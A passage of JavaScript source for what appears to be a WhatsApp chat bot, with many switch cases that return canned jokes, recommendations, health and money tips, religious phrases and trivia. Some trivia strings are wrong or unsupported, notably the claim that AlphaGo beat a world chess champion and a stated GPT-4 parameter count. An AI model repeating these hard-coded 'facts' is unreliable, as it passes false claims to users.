//=====================================//

      case "maybe": { mzazireply(`🤔 MAYBE...`); break; }
//=====================================//

      case "idk": { mzazireply(`🤷 I don't know! ¯\\_(ツ)_/¯`); break; }
//=====================================//

      case "lol": { mzazireply(`😂 LOL! Hahaha! 😂`); break; }
//=====================================//

      case "omg": { mzazireply(`😱 OH MY GOD! 😱`); break; }
//=====================================//

      case "wtf": { mzazireply(`😤 What the... 😤`); break; }
//=====================================//

      case "gg": { mzazireply(`🎮 GG (Good Game)! Well played! 🏆`); break; }
//=====================================//

      case "nt": { mzazireply(`💪 NT (Nice Try)! Keep it up! 🌟`); break; }
//=====================================//

      case "wp": { mzazireply(`🌟 WP (Well Played)! Great job! 🏆`); break; }
//=====================================//

      case "ez": { mzazireply(`😏 EZ (Easy)! Too easy! 😂`); break; }
//=====================================//

      case "rip": { const t24 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; mzazireply(`⚰️ RIP ${t24 ? `@${jidToNumber(t24)}` : "😔"}\n\n*presses F to pay respects*\n\n[ F ]`); break; }
//=====================================//

      case "f": { mzazireply(`🕯️ F\n\n*pressing F to pay respects*`); break; }
//=====================================//

      case "sus": { const t25 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; mzazireply(`📮 ${t25 ? `@${jidToNumber(t25)}` : "that person"} is kinda sus... 📮 AMOGUS`); break; }
//=====================================//

      case "noob": { const t26 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; mzazireply(`🥲 ${t26 ? `@${jidToNumber(t26)}` : "you"} = NOOB! 🥲\n\nGet good! 💪`); break; }
//=====================================//

      case "pro": { const t27 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; mzazireply(`🏆 ${t27 ? `@${jidToNumber(t27)}` : "you"} = PRO! 🏆\n\nLegend! ⭐`); break; }
//=====================================//

      case "xd": { mzazireply(`😂 XD HAHAHA 😂`); break; }

      // ═══════════════════════════════════════════════════════
      //  FOOD & DRINK COMMANDS
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "food": { const foods = ["🍕 Pizza","🍔 Burger","🍜 Ramen","🍣 Sushi","🌮 Tacos","🍰 Cake","🍦 Ice Cream","🥗 Salad","🍗 Chicken","🍱 Bento","🌯 Burrito","🥞 Pancakes","🍟 Fries","🍛 Curry","🧆 Falafel"]; mzazireply(`🍴 *RANDOM FOOD*\n\n${foods[Math.floor(Math.random()*foods.length)]}`); break; }
//=====================================//

      case "drink": { const drinks = ["☕ Coffee","🧋 Bubble Tea","🍵 Green Tea","🥤 Soda","🧃 Juice","💧 Water","🍺 Root Beer","🥛 Milk","🫖 Herbal Tea","🍹 Smoothie"]; mzazireply(`🥤 *RANDOM DRINK*\n\n${drinks[Math.floor(Math.random()*drinks.length)]}`); break; }
//=====================================//

      case "recipe": { if (!text) return mzazireply(`Example: ${prefix}recipe pizza`); mzazireply(`🍴 *RECIPE: ${text.toUpperCase()}*\n\n🔍 Search on:\n• allrecipes.com\n• food.com\n• cooking.com\n\n_Happy cooking!_ 👨‍🍳`); break; }
//=====================================//

      case "calories": { if (!text) return mzazireply(`Example: ${prefix}calories apple`); const calMap = {apple:95,banana:105,pizza:285,burger:540,rice:206,egg:78,chicken:335,milk:149}; const cal = calMap[text.toLowerCase()]; mzazireply(`🔥 *CALORIES*\n\n${text}: ${cal ? `~${cal} calories per serving` : "Look it up on myfitnesspal.com"}`); break; }
//=====================================//

      case "hungryornot": { const val = Math.random() > 0.5; mzazireply(`🍽️ Are you hungry?\n\n${val ? "YES! Go eat something! 🍔" : "No, you just ate! 😄"}`); break; }

      // ═══════════════════════════════════════════════════════
      //  MUSIC & ENTERTAINMENT
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "genre": { const genres = ["🎸 Rock","🎤 Pop","🎵 Hip-Hop","🎻 Classical","🥁 Reggae","🎹 Jazz","🎷 Blues","🎼 R&B","🎧 Electronic","🌊 Afrobeats","🎺 Gospel","🎻 Country"]; mzazireply(`🎵 *RANDOM GENRE*\n\nListen to some: ${genres[Math.floor(Math.random()*genres.length)]}`); break; }
//=====================================//

      case "song": { const songs = ["Blinding Lights - The Weeknd 🎵","Shape of You - Ed Sheeran 🎶","Africa - TOTO 🌍","Bohemian Rhapsody - Queen 👑","Lose Yourself - Eminem 🎤","Despacito - Luis Fonsi 🎸","Rolling in the Deep - Adele 🎵","Thriller - Michael Jackson 🕺","Hotel California - Eagles 🎶","Watermelon Sugar - Harry Styles 🍉"]; mzazireply(`🎵 *SONG RECOMMENDATION*\n\n${songs[Math.floor(Math.random()*songs.length)]}`); break; }
//=====================================//

      case "movie": { const movies = ["The Dark Knight 🦇","Inception 💭","Interstellar 🌌","The Matrix 💊","Parasite 🎭","Avengers: Endgame 🦸","Lion King 🦁","Titanic 🚢","Forrest Gump 🏃","The Shawshank Redemption 🔒"]; mzazireply(`🎬 *MOVIE RECOMMENDATION*\n\n${movies[Math.floor(Math.random()*movies.length)]}`); break; }
//=====================================//

      case "series": { const series = ["Breaking Bad 🧪","Game of Thrones ⚔️","The Office 💼","Friends 👯","Stranger Things 👻","Money Heist 💰","The Crown 👑","Black Mirror 📱","House of Cards 🃏","The Mandalorian 🚀"]; mzazireply(`📺 *SERIES RECOMMENDATION*\n\n${series[Math.floor(Math.random()*series.length)]}`); break; }
//=====================================//

      case "anime": { const animes = ["Naruto 🍥","Attack on Titan ⚔️","One Piece ☠️","Dragon Ball Z 🔥","Death Note 📓","Fullmetal Alchemist 🔗","My Hero Academia 💪","Demon Slayer ⚔️","One Punch Man 👊","Hunter x Hunter 🎯"]; mzazireply(`🎌 *ANIME RECOMMENDATION*\n\n${animes[Math.floor(Math.random()*animes.length)]}`); break; }
//=====================================//

      case "manga": { const mangas = ["Naruto","One Piece","Bleach","Dragon Ball","Death Note","Attack on Titan","Fullmetal Alchemist","Berserk","Vinland Saga","JoJo's Bizarre Adventure"]; mzazireply(`📚 *MANGA RECOMMENDATION*\n\n${mangas[Math.floor(Math.random()*mangas.length)]}`); break; }
//=====================================//

      case "game2": { const games = ["Minecraft 🏗️","Among Us 📮","GTA V 🚗","FIFA 2024 ⚽","Fortnite 🎯","Call of Duty 🔫","Roblox 🎮","PUBG Mobile 🔫","Free Fire 🔥","Chess ♟️"]; mzazireply(`🎮 *GAME RECOMMENDATION*\n\n${games[Math.floor(Math.random()*games.length)]}`); break; }
//=====================================//

      case "book": { const books = ["1984 - George Orwell 📖","The Alchemist - Paulo Coelho ✨","Atomic Habits - James Clear ⚡","Rich Dad Poor Dad - R. Kiyosaki 💰","The 48 Laws of Power - R. Greene 👑","Think and Grow Rich - N. Hill 💭","The 7 Habits - S. Covey 📋","How to Win Friends - D. Carnegie 🤝","Sapiens - Y.N. Harari 🌍","The Psychology of Money - M. Housel 💵"]; mzazireply(`📚 *BOOK RECOMMENDATION*\n\n${books[Math.floor(Math.random()*books.length)]}`); break; }

      // ═══════════════════════════════════════════════════════
      //  SPORT COMMANDS
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "sport": { const sports = ["⚽ Football/Soccer","🏀 Basketball","🎾 Tennis","🏏 Cricket","🏈 American Football","🏊 Swimming","🏃 Athletics","🥊 Boxing","🎱 Pool/Snooker","🏋️ Weightlifting","🤸 Gymnastics","🏇 Horse Racing"]; mzazireply(`🏆 *RANDOM SPORT*\n\n${sports[Math.floor(Math.random()*sports.length)]}`); break; }
//=====================================//

      case "football":
//=====================================//

      case "soccer": { mzazireply(`⚽ *FOOTBALL TRIVIA*\n\nThe sport with the most fans worldwide!\n\n🏆 Most World Cups: Brazil (5)\n⭐ Top Scorers: Ronaldo & Messi\n🌍 Biggest Stadium: Rungrado (NK)\n\nWho's your team? 🤔`); break; }
//=====================================//

      case "basketball": { mzazireply(`🏀 *BASKETBALL TRIVIA*\n\nThe height of a basketball hoop is 10 feet!\n\n🏆 Most NBA Titles: Boston Celtics\n⭐ GOAT: Michael Jordan or LeBron?\n🌍 NBA started: 1946\n\nWho's your favorite player? 🤔`); break; }
//=====================================//

      case "cricket": { mzazireply(`🏏 *CRICKET TRIVIA*\n\nThe longest Test match lasted 12 days!\n\n🏆 Most World Cups: Australia (6)\n⭐ Most runs: Sachin Tendulkar\n🌍 Origin: England`); break; }
//=====================================//

      case "boxing": { mzazireply(`🥊 *BOXING TRIVIA*\n\n"Float like a butterfly, sting like a bee!"\n- Muhammad Ali\n\n🏆 Greatest: Ali, Tyson, Mayweather\n💪 Keep training! You've got this!`); break; }
//=====================================//

      case "chess": { mzazireply(`♟️ *CHESS TIPS*\n\n1. Control the center early\n2. Develop pieces before attacking\n3. King safety is crucial\n4. Connect your rooks\n5. Have a plan!\n\n🧠 Chess improves memory and IQ!`); break; }
//=====================================//

      case "fitness": { const tips = ["💪 Do 30 mins exercise daily!","🏃 Morning jog improves energy!","🧘 Yoga reduces stress!","🚴 Cycling is great cardio!","🏊 Swimming works whole body!","💪 Push-ups build upper strength!","🏋️ Start with light weights!","🤸 Stretching prevents injury!"]; mzazireply(`🏃 *FITNESS TIP*\n\n${tips[Math.floor(Math.random()*tips.length)]}`); break; }
//=====================================//

      case "workout": { mzazireply(`💪 *QUICK WORKOUT*\n\n1. 20 Push-ups\n2. 30 Squats\n3. 15 Burpees\n4. 1 min Plank\n5. 20 Jumping Jacks\n\nRepeat 3x!\n💦 Don't forget water!`); break; }

      // ═══════════════════════════════════════════════════════
      //  TRAVEL & GEOGRAPHY
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "travel": { const places = ["🗼 Paris, France","🗽 New York, USA","🏯 Tokyo, Japan","🏛️ Rome, Italy","🏙️ Dubai, UAE","🌴 Bali, Indonesia","🏔️ Swiss Alps","🌊 Maldives","🦁 Nairobi, Kenya","🌺 Honolulu, Hawaii"]; mzazireply(`✈️ *TRAVEL DESTINATION*\n\nWish you could visit:\n${places[Math.floor(Math.random()*places.length)]}`); break; }
//=====================================//

      case "africa": { mzazireply(`🌍 *AFRICA FACTS*\n\n• 54 countries\n• 1.4+ billion people\n• Largest continent by country count\n• Birth of humanity\n• 2000+ languages\n• Home to Sahara desert\n• Richest in natural resources\n\n🌟 Africa Rising!`); break; }
//=====================================//

      case "kenya": { mzazireply(`🇰🇪 *KENYA FACTS*\n\n🦁 Wildlife paradise\n🏔️ Mt. Kenya (5,199m)\n🌊 Great Rift Valley\n🏙️ Capital: Nairobi\n💰 Currency: KES\n👥 55+ million people\n🌿 Maasai Mara\n☕ Famous for: Safari, Tea, Athletics`); break; }
//=====================================//

      case "flag": { if (!text) return mzazireply(`Example: ${prefix}flag Kenya`); const flags = {kenya:"🇰🇪",usa:"🇺🇸",uk:"🇬🇧",germany:"🇩🇪",france:"🇫🇷",japan:"🇯🇵",china:"🇨🇳",india:"🇮🇳",brazil:"🇧🇷",australia:"🇦🇺",nigeria:"🇳🇬",ghana:"🇬🇭",tanzania:"🇹🇿",uganda:"🇺🇬",ethiopia:"🇪🇹",southafrica:"🇿🇦"}; const f = flags[text.toLowerCase().replace(/\s/g,"")]; mzazireply(`${f || "🏳️"} ${text.toUpperCase()}`); break; }
//=====================================//

      case "capital": { const capitals = {kenya:"Nairobi",usa:"Washington D.C.",uk:"London",france:"Paris",germany:"Berlin",japan:"Tokyo",china:"Beijing",india:"New Delhi",brazil:"Brasília",australia:"Canberra",nigeria:"Abuja",ghana:"Accra",tanzania:"Dodoma",ethiopia:"Addis Ababa"}; if (!text) return mzazireply(`Example: ${prefix}capital Kenya`); const cap = capitals[text.toLowerCase()]; mzazireply(`🏙️ *CAPITAL*\n\n${text}: ${cap || "Unknown"}`); break; }
//=====================================//

      case "phonecode": { const codes = {kenya:"+254",usa:"+1",uk:"+44",france:"+33",germany:"+49",japan:"+81",china:"+86",india:"+91",brazil:"+55",nigeria:"+234",ghana:"+233"}; if (!text) return mzazireply(`Example: ${prefix}phonecode Kenya`); const c3 = codes[text.toLowerCase()]; mzazireply(`📞 *PHONE CODE*\n\n${text}: ${c3 || "Unknown"}`); break; }
//=====================================//

      case "continent": { const continents2 = {africa:"54 countries, 1.4B people",asia:"48 countries, 4.7B people",europe:"44 countries, 748M people",northamerica:"23 countries, 600M people",southamerica:"12 countries, 435M people",oceania:"14 countries, 44M people",antarctica:"0 countries, 5000 researchers"}; if (!text) return mzazireply(`Continents: ${Object.keys(continents2).join(", ")}\nExample: ${prefix}continent africa`); const cont = continents2[text.toLowerCase().replace(/\s/g,"")]; mzazireply(`🌍 *${text.toUpperCase()}*\n\n${cont || "Unknown continent"}`); break; }

      // ═══════════════════════════════════════════════════════
      //  TECHNOLOGY & PROGRAMMING
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "tech": { const techs = ["AI is transforming every industry! 🤖","5G is 100x faster than 4G! 📡","Quantum computers can solve in seconds what would take years! ⚡","The first computer weighed 27 tons! 🖥️","There are more code lines in your phone than in a rocket! 🚀","Bitcoin was worth $0.0001 in 2009! ₿","1 Zettabyte = 1 billion Terabytes! 💾"]; mzazireply(`💻 *TECH FACT*\n\n${techs[Math.floor(Math.random()*techs.length)]}`); break; }
//=====================================//

      case "code": { const snippets = ["```\nlogger.info('Hello World!');\n```","```\nprint('Hello World!')\n```","```\n#include<stdio.h>\nint main(){printf(\"Hello World!\");}\n```","```\necho 'Hello World!'\n```"]; mzazireply(`👨‍💻 *HELLO WORLD*\n\n${snippets[Math.floor(Math.random()*snippets.length)]}`); break; }
//=====================================//

      case "codingtip": { const tips2 = ["Write code for humans first, machines second! 👨‍💻","Comments save future you! Write them. 💬","DRY - Don't Repeat Yourself! 🔄","Test your code, then test it again! ✅","Read error messages carefully - they help! 🔍","Version control (Git) is your safety net! 🌐","Break big problems into small ones! 🧩","Clean code = fewer bugs! 🐛"]; mzazireply(`💡 *CODING TIP*\n\n${tips2[Math.floor(Math.random()*tips2.length)]}`); break; }
//=====================================//

      case "programming": { const langs = ["JavaScript 🟨","Python 🐍","Java ☕","C++ ⚡","TypeScript 💙","Rust 🦀","Go 🔵","PHP 💜","Swift 🍎","Kotlin 🔶","Dart 🎯","Ruby 💎"]; mzazireply(`💻 *RANDOM LANGUAGE*\n\nLearn: ${langs[Math.floor(Math.random()*langs.length)]}`); break; }
//=====================================//

      case "internet": { mzazireply(`🌐 *INTERNET FACTS*\n\n• 5.3+ billion internet users\n• 500+ million tweets/day\n• 4+ billion hours YouTube/day\n• 300+ billion emails/day\n• 200+ billion WhatsApp messages/day!\n• First website: 1991\n• Google processes 8.5B searches/day`); break; }
//=====================================//

      case "ai": { mzazireply(`🤖 *AI FACTS*\n\n• AI was coined in 1956\n• GPT-4 has 1 trillion parameters\n• AI can now create art, music, code\n• 85M jobs may be displaced by 2025\n• But 97M new jobs will emerge\n• AlphaGo beat world chess champion\n• Your phone uses AI daily!`); break; }
//=====================================//

      case "blockchain": { mzazireply(`⛓️ *BLOCKCHAIN FACTS*\n\n• Bitcoin invented in 2009\n• Blockchain = immutable ledger\n• 20,000+ cryptocurrencies exist\n• Smart contracts run automatically\n• NFT = Non-Fungible Token\n• Web3 is the decentralized web\n• DeFi = Decentralized Finance`); break; }
//=====================================//

      case "cybersecurity": { mzazireply(`🔐 *CYBERSECURITY TIPS*\n\n1. Use strong, unique passwords\n2. Enable 2FA everywhere\n3. Don't click unknown links\n4. Update software regularly\n5. Use a VPN on public WiFi\n6. Back up your data\n7. Be careful what you share online\n\n🛡️ Stay safe!`); break; }

      // ═══════════════════════════════════════════════════════
      //  HEALTH & WELLNESS
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "health": { const tips3 = ["💧 Drink 8 glasses of water daily!","🥗 Eat more fruits and vegetables!","😴 Get 7-9 hours of sleep!","🚶 Walk 10,000 steps daily!","😊 Practice gratitude daily!","🧘 Meditate for 10 mins/day!","📵 Reduce screen time before bed!","🌿 Eat less processed food!"]; mzazireply(`❤️ *HEALTH TIP*\n\n${tips3[Math.floor(Math.random()*tips3.length)]}`); break; }
//=====================================//

      case "mentalhealth": { mzazireply(`🧠 *MENTAL HEALTH TIPS*\n\n1. It's okay to not be okay 💙\n2. Talk to someone you trust\n3. Take breaks when needed\n4. Practice self-care\n5. Limit social media\n6. Exercise regularly\n7. Celebrate small wins\n8. You are not alone ❤️\n\n_Your mental health matters!_`); break; }
//=====================================//

      case "sleep": { mzazireply(`😴 *SLEEP TIPS*\n\n• Stick to a sleep schedule\n• Avoid screens 1hr before bed\n• Keep bedroom cool & dark\n• Avoid caffeine after 2pm\n• Wind down with reading\n• 7-9 hours is ideal for adults\n• Naps under 30 mins are beneficial\n\n🌙 Sleep well!`); break; }
//=====================================//

      case "water": { mzazireply(`💧 *HYDRATION FACTS*\n\n• 60% of human body is water\n• Drink 8 glasses (2L) daily\n• Dehydration causes fatigue\n• Water improves brain function\n• Warm water aids digestion\n• Drink water before meals\n• Always carry a water bottle!\n\n💧 Stay hydrated!`); break; }
//=====================================//

      case "meditation": { mzazireply(`🧘 *MEDITATION GUIDE*\n\n1. Find a quiet place\n2. Sit comfortably\n3. Close your eyes\n4. Focus on your breath\n5. Inhale 4 counts\n6. Hold 4 counts\n7. Exhale 4 counts\n8. Do for 10 minutes\n\n✨ Peace found!`); break; }
//=====================================//

      case "stretching": { mzazireply(`🤸 *STRETCHING ROUTINE*\n\n• Neck rolls - 30 secs\n• Shoulder stretch - 30 secs each\n• Hip flexor - 30 secs each\n• Hamstring stretch - 30 secs each\n• Calf raises - 15 reps\n• Child's pose - 1 minute\n\n💪 Do daily for flexibility!`); break; }

      // ═══════════════════════════════════════════════════════
      //  BUSINESS & MONEY
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "money": { const mtips = ["💡 Save 20% of every income you get!","📈 Invest early - compound interest is magical!","💳 Pay off high-interest debt first!","🏠 Buy assets, not liabilities!","📊 Track your expenses daily!","🎯 Set financial goals with deadlines!","💰 Multiple income streams = financial freedom!"]; mzazireply(`💰 *MONEY TIP*\n\n${mtips[Math.floor(Math.random()*mtips.length)]}`); break; }
//=====================================//

      case "invest": { mzazireply(`📈 *INVESTMENT TIPS*\n\n1. Start early, even small amounts\n2. Diversify your portfolio\n3. Don't invest what you can't lose\n4. Long-term beats short-term\n5. Research before investing\n6. Stocks, bonds, real estate\n7. Emergency fund first!\n\n💰 Financial freedom!`); break; }
//=====================================//

      case "business": { const btips = ["🎯 Solve a real problem!","👥 Build a team, not a solo venture!","📊 Track metrics that matter!","🤝 Network, network, network!","💡 Fail fast, learn faster!","📱 Go digital first!","❤️ Treat customers like royalty!"]; mzazireply(`🏢 *BUSINESS TIP*\n\n${btips[Math.floor(Math.random()*btips.length)]}`); break; }
//=====================================//

      case "entrepreneur": { mzazireply(`🚀 *ENTREPRENEUR MINDSET*\n\n• Problems = Opportunities\n• Failure = Learning\n• Risk = Reward\n• Network = Net Worth\n• Ideas are worthless without execution\n• Start before you're ready\n• Customers are your compass\n\n💪 Just start!`); break; }
//=====================================//

      case "savings": { mzazireply(`💰 *SAVINGS CHALLENGE*\n\n📌 52-Week Challenge:\nWeek 1: Save KES 100\nWeek 2: Save KES 200\n...\nWeek 52: Save KES 5200\n\nTotal: KES 137,800!\n\n🎯 Start today!`); break; }

      // ═══════════════════════════════════════════════════════
      //  EDUCATION & LEARNING
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "study": { const studyTips = ["📖 Study in 25-minute blocks (Pomodoro)!","✏️ Handwriting notes beats typing!","🎵 Classical music improves focus!","😴 Sleep consolidates memories!","🔄 Spaced repetition = better recall!","📝 Teach others to learn faster!","🌟 Visualize concepts with diagrams!"]; mzazireply(`📚 *STUDY TIP*\n\n${studyTips[Math.floor(Math.random()*studyTips.length)]}`); break; }
//=====================================//

      case "learn": { const skills = ["🖥️ Programming/Coding","📊 Data Analysis","🎨 Graphic Design","📸 Photography","🎬 Video Editing","📝 Copywriting","🌐 Digital Marketing","💹 Stock Trading","🎸 Playing Guitar","🗣️ Public Speaking"]; mzazireply(`🎓 *SKILL TO LEARN*\n\nConsider learning:\n${skills[Math.floor(Math.random()*skills.length)]}`); break; }
//=====================================//

      case "math2": { const problems = [{q:"What is 15 × 15?",a:"225"},{q:"What is √144?",a:"12"},{q:"What is 7!?",a:"5040"},{q:"What % is 30 of 120?",a:"25%"},{q:"What is the area of a circle with r=7?",a:"153.94"}]; const p = problems[Math.floor(Math.random()*problems.length)]; mzazireply(`🧮 *MATH CHALLENGE*\n\n❓ ${p.q}\n\n||Answer: ${p.a}||`); break; }
//=====================================//

      case "science": { const sciQs = [{q:"What is photosynthesis?",a:"Process by which plants make food using sunlight"},{q:"What is Newton's 1st law?",a:"Objects at rest stay at rest unless acted upon"},{q:"What element has symbol Au?",a:"Gold"},{q:"What is the speed of sound?",a:"343 m/s at sea level"},{q:"How many chromosomes in a human?",a:"46"}]; const sq = sciQs[Math.floor(Math.random()*sciQs.length)]; mzazireply(`🔬 *SCIENCE QUIZ*\n\n❓ ${sq.q}\n\n||Answer: ${sq.a}||`); break; }
//=====================================//

      case "history": { const histFacts = ["Julius Caesar was stabbed 23 times on the Ides of March! 🏛️","The Great Wall of China took over 1000 years to build! 🏯","Cleopatra lived closer to the Moon landing than to the Great Pyramid's construction! 🌙","Napoleon was not actually that short. He was 5'7 - average for his time! 📏","The shortest war in history lasted 38-45 minutes! ⚔️"]; mzazireply(`📜 *HISTORY FACT*\n\n${histFacts[Math.floor(Math.random()*histFacts.length)]}`); break; }
//=====================================//

      case "geography": { const geoFacts = ["Russia spans 11 time zones! 🌍","Canada has the most lakes in the world! 🏞️","Vatican City is the smallest country in the world! ⛪","Australia is wider than the moon! 🌕","The Amazon River discharges 20% of all freshwater to oceans! 🌊","Africa is actually much larger than it appears on maps! 🗺️"]; mzazireply(`🌍 *GEOGRAPHY FACT*\n\n${geoFacts[Math.floor(Math.random()*geoFacts.length)]}`); break; }

      // ═══════════════════════════════════════════════════════
      //  RELIGION & SPIRITUALITY
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "allah": { mzazireply(`☪️ *SUBHANALLAH*\n\nAllah is the Greatest!\nAll praise is to Allah!\nThere is no God but Allah!\n\n🤲 May Allah bless you!`); break; }
//=====================================//

      case "bismillah": { mzazireply(`☪️ *BISMILLAH*\n\nبِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ\n\nIn the name of Allah, the Most Gracious, the Most Merciful.\n\n🤲 Ameen`); break; }
//=====================================//

      case "alhamdulillah": { mzazireply(`🤲 *ALHAMDULILLAH*\n\nالْحَمْدُ لِلَّهِ\n\n"All praise is due to Allah"\n\n🌟 Be grateful for every blessing!`); break; }
//=====================================//

      case "inshallah": { mzazireply(`☪️ *INSHALLAH*\n\nإِن شَاءَ ٱللَّٰهُ\n\n"If Allah wills it"\n\n✨ May Allah make it easy!`); break; }
//=====================================//

      case "mashallah": { mzazireply(`✨ *MASHALLAH*\n\nمَا شَاءَ ٱللَّٰهُ\n\n"What Allah has willed"\n\n🌹 Allah's blessing upon you!`); break; }
//=====================================//

      case "verse":
//=====================================//

      case "bible2": { const verses2 = ["For God so loved the world that he gave his only Son... - John 3:16","I can do all things through Christ who strengthens me - Philippians 4:13","The Lord is my shepherd; I shall not want - Psalm 23:1","Trust in the Lord with all your heart - Proverbs 3:5","Be strong and courageous - Joshua 1:9"]; mzazireply(`✝️ *BIBLE VERSE*\n\n${verses2[Math.floor(Math.random()*verses2.length)]}`); break; }

      // ═══════════════════════════════════════════════════════
      //  RELATIONSHIP & SOCIAL
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "relationship": { const rtips = ["💑 Communication is key in any relationship!","❤️ Love is a verb - show it daily!","🤝 Respect is the foundation of all relationships!","💬 Listen more than you speak!","🌹 Appreciate the little things!","⏰ Quality time > Quantity time!","🤗 Forgiveness heals all wounds!"]; mzazireply(`💕 *RELATIONSHIP TIP*\n\n${rtips[Math.floor(Math.random()*rtips.length)]}`); break; }
//=====================================//

      case "friendship": { mzazireply(`👫 *FRIENDSHIP FACTS*\n\n• True friends are rare - cherish them!\n• 3-5 close friends is healthy\n• Shared experiences build bonds\n• Distance can't break true friendships\n• A friend who listens is priceless\n• Be the friend you want to have\n\n💙 Appreciate your friends today!`); break; }
//=====================================//

      case "advice2": { const advice2 = ["Don't worry about what others think of you. Their opinion isn't your reality.","The secret to happiness? Stop comparing yourself to others.","Work hard in silence; let your success make the noise.","You can't pour from an empty cup. Take care of yourself first.","Sometimes the right path is not the easiest one.","Your only competition is who you were yesterday."]; mzazireply(`💡 *LIFE ADVICE*\n\n${advice2[Math.floor(Math.random()*advice2.length)]}`); break; }
//=====================================//

      case "icebreaker": { const ice = ["What superpower would you choose and why?","If you could live in any era, when would you choose?","What's the most adventurous thing you've ever done?","If you were an animal, what would you be?","What would you do with a billion dollars?","What's your hidden talent?","Which fictional world would you want to live in?"]; mzazireply(`🎯 *ICE BREAKER*\n\n${ice[Math.floor(Math.random()*ice.length)]}`); break; }
//=====================================//

      case "confess": { mzazireply(`🤫 *CONFESSION BOX*\n\nThis is a safe space!\nSend your anonymous confession:\n\n${prefix}ngl @user <your confession>\n\n_All confessions are confidential_ 🔒`); break; }

      // ═══════════════════════════════════════════════════════
      //  NATURE & ANIMALS
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "animal": { const animals2 = ["🦁 Lion - King of the jungle","🐘 Elephant - Never forgets","🐧 Penguin - Cannot fly but can swim!","🦒 Giraffe - Tallest animal","🦈 Shark - Been around 450M years","🐬 Dolphin - Uses echolocation","🦅 Eagle - Can see 8x better than humans","🐙 Octopus - 3 hearts, blue blood!","🦋 Butterfly - Tastes with its feet!","🐳 Blue Whale - Loudest animal on Earth"]; mzazireply(`🌿 *RANDOM ANIMAL*\n\n${animals2[Math.floor(Math.random()*animals2.length)]}`); break; }
//=====================================//

      case "nature": { const natureFacts = ["Trees communicate through fungi underground! 🌳","There are more stars in the universe than grains of sand on Earth! ⭐","Lightning strikes Earth 100 times per second! ⚡","A single tree produces enough oxygen for 2 people! 🌲","The ocean produces 50-80% of Earth's oxygen! 🌊","Rainforests are home to 50% of all species! 🌿"]; mzazireply(`🌍 *NATURE FACT*\n\n${natureFacts[Math.floor(Math.random()*natureFacts.length)]}`); break; }
//=====================================//

      case "space": { const spaceFacts = ["There are more stars in the universe than grains of sand on all Earth's beaches! ⭐","One day on Venus is longer than a year on Venus! 🌍","The Sun makes up 99.86% of the solar system's mass! ☀️","Light from the Sun takes 8 minutes to reach Earth! 💡","The Milky Way has 200-400 billion stars! 🌌","A teaspoon of neutron star weighs 1 billion tons! 🌟"]; mzazireply(`🌌 *SPACE FACT*\n\n${spaceFacts[Math.floor(Math.random()*spaceFacts.length)]}`); break; }
//=====================================//

      case "ocean": { mzazireply(`🌊 *OCEAN FACTS*\n\n• 71% of Earth is covered by oceans\n• Only 5% has been explored!\n• Deepest point: 11km (Mariana Trench)\n• More species in ocean than land\n• Oceans regulate climate\n• Bioluminescent creatures glow!\n• 97% of Earth's water is ocean`); break; }
//=====================================//

      case "weather2": { const wfacts = ["⚡ A bolt of lightning is 5x hotter than the sun!","🌪️ A tornado's winds can reach 300mph!","❄️ No two snowflakes are alike!","🌈 Rainbows are actually full circles!","☁️ Clouds can weigh millions of pounds!","💧 Rain smell is called petrichor!"]; mzazireply(`🌤️ *WEATHER FACT*\n\n${wfacts[Math.floor(Math.random()*wfacts.length)]}`); break; }

      // ═══════════════════════════════════════════════════════
      //  LANGUAGE & CULTURE
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "swahili": { const sw = [{e:"Hello",s:"Habari / Jambo"},{e:"Thank you",s:"Asante"},{e:"Yes",s:"Ndiyo"},{e:"No",s:"Hapana"},{e:"How are you?",s:"Habari yako?"},{e:"Good morning",s:"Habari ya asubuhi"},{e:"Goodbye",s:"Kwaheri"},{e:"Please",s:"Tafadhali"},{e:"I love you",s:"Nakupenda"},{e:"God is great",s:"Mungu ni mkubwa"}]; const word = sw[Math.floor(Math.random()*sw.length)]; mzazireply(`🗣️ *SWAHILI WORD*\n\n🇬🇧 English: ${word.e}\n🇰🇪 Swahili: *${word.s}*`); break; }
//=====================================//

      case "french": { const fr = [{e:"Hello",f:"Bonjour"},{e:"Thank you",f:"Merci"},{e:"Yes",f:"Oui"},{e:"No",f:"Non"},{e:"I love you",f:"Je t'aime"},{e:"Good morning",f:"Bonjour"},{e:"Goodbye",f:"Au revoir"},{e:"How are you?",f:"Comment allez-vous?"}]; const fw = fr[Math.floor(Math.random()*fr.length)]; mzazireply(`🗣️ *FRENCH WORD*\n\n🇬🇧 English: ${fw.e}\n🇫🇷 French: *${fw.f}*`); break; }
//=====================================//

      case "spanish": { const es = [{e:"Hello",s:"Hola"},{e:"Thank you",s:"Gracias"},{e:"Yes",s:"Sí"},{e:"No",s:"No"},{e:"I love you",s:"Te amo"},{e:"Good morning",s:"Buenos días"},{e:"Goodbye",s:"Adiós"},{e:"How are you?",s:"¿Cómo estás?"}]; const ew = es[Math.floor(Math.random()*es.length)]; mzazireply(`🗣️ *SPANISH WORD*\n\n🇬🇧 English: ${ew.e}\n🇪🇸 Spanish: *${ew.s}*`); break; }
//=====================================//

      case "arabic": { const ar = [{e:"Hello",a:"مرحبا (Marhaba)"},{e:"Thank you",a:"شكراً (Shukran)"},{e:"Yes",a:"نعم (Na'am)"},{e:"No",a:"لا (La)"},{e:"God willing",a:"إن شاء الله (Inshallah)"},{e:"Praise God",a:"الحمد لله (Alhamdulillah)"}]; const aw = ar[Math.floor(Math.random()*ar.length)]; mzazireply(`🗣️ *ARABIC WORD*\n\n🇬🇧 English: ${aw.e}\n🇸🇦 Arabic: *${aw.a}*`); break; }
//=====================================//

